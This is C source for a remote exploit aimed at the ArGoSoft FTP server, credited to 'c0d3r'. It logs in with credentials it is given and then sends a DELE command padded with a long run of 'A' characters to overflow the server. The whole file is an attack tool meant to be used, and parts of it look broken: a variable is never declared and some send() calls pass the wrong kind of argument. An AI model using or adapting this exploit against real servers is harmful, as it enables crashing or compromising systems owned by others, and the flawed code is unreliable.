 int main (int argc, char *argv[]){

  unsigned char *recvbuf,*user,*pass;
  unsigned int rc,addr,sock ;
  struct sockaddr_in tcp;
  struct hostent *hp;
  WSADATA wsaData;
  char buffer[size];
  unsigned short port;

  int i;
  if(argc < 5) {
      printf("\n-------- ArGoSoft Ftp remote exploit by c0d3r --------\n");
   printf("-------- usage : argo.exe host port user pass --------\n");
   printf("-------- eg: argo.exe 127.0.0.1 21 c0d3r secret --------\n\n");
  exit(-1) ;
  }
  printf("\n-------- ArGoSoft Ftp remote exploit by c0d3r --------\n\n");
  recvbuf = malloc(256);
  memset(recvbuf,0,256);
  
  //Creating exploit code
  printf("[+] building overflow string");
    memset(buffer,0,size);

   buffer[0] = 'D';buffer[1] = 'E';buffer[2] = 'L';buffer[3]='E'; buffer[4]= 0x20;
   for(i = 5;i != 286;i++){
   buffer[i] = 'A';
  }
 //EO exploit code

  user = malloc(256);
  memset(user,0,256);

  pass = malloc(256);
  memset(pass,0,256);

  sprintf(user,"user %s\r\n",argv[3]);
  sprintf(pass,"pass %s\r\n",argv[4]);
  
   if (WSAStartup(MAKEWORD(2,1),&wsaData) != 0){
   printf("[-] WSAStartup failed !\n");
   exit(-1);
  }
 hp = gethostbyname(argv[1]);
  if (!hp){
   addr = inet_addr(argv[1]);
  }
  if ((!hp) && (addr == INADDR_NONE) ){
   printf("[-] unable to resolve %s\n",argv[1]);
   exit(-1);
  }
  sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
  if (!sock){
   printf("[-] socket() error...\n");
   exit(-1);
  }
   if (hp != NULL)
   memcpy(&(tcp.sin_addr),hp->h_addr,hp->h_length);
  else
   tcp.sin_addr.s_addr = addr;

  if (hp)
   tcp.sin_family = hp->h_addrtype;
  else
  tcp.sin_family = AF_INET;
  port=atoi(argv[2]);
  tcp.sin_port=htons(port);
   
  
  printf("\n[+] attacking host %s\n" , argv[1]) ;
  
  Sleep(1000);
  
  printf("[+] packet size = %d byte\n" , sizeof(buffer));
  
  rc=connect(sock, (struct sockaddr *) &tcp, sizeof (struct sockaddr_in));
  if(rc==0)
  {
    
     Sleep(1000) ;
  printf("[+] connected\n") ;
     rc2=recv(sock,recvbuf,256,0);
     printf("[+] sending username\n");
     send(sock,user,strlen(user),0);
     send(sock,'\n',1,0);
     printf("[+] sending passworld\n");
     Sleep(1000);  
	 send(sock,pass,strlen(pass),0);
     send(sock,'\n',1,0);
     Sleep(1000);
	 send(sock,buffer,strlen(buffer),0);
	 send(sock,'\n',1,0);
	 printf("[+] string sent successfully check the main window for result\n");
  }
  
  else {
      printf("[-] ArGo is not listening .... \n");
 }
  shutdown(sock,1);
  closesocket(sock);
 
}